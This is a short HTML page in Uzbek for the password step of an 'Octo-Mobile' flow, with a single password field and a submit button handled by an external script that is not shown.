<!DOCTYPE html>
<html lang="uz">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Octo-Mobile Password</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;700;800&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="./styles.css" />
  </head>
  <body data-screen="flow" data-step="password">
    <div class="page-shell"></div>

    <main class="page">
      <section class="step-card">
        <a class="back-link" href="/services/octo">←</a>
<header class="hero-copy step-copy">
          <h1>Parolni kiriting</h1>
          </header>

        <form class="step-form" id="stepForm">
          <div class="phone-field single-field">
            <input
              id="stepValue"
              name="value"
              type="password"
              autocomplete="current-password"
              placeholder="••••••••"
              required
            />
          </div>

          <button class="submit-btn secondary-btn" type="submit" id="submitStepButton">
            Yuborish
          </button>
          <p class="status" id="statusMessage" aria-live="polite"></p>
        </form>
      </section>
    </main>

    <script src="./flow.js"></script>
  </body>
  </html>
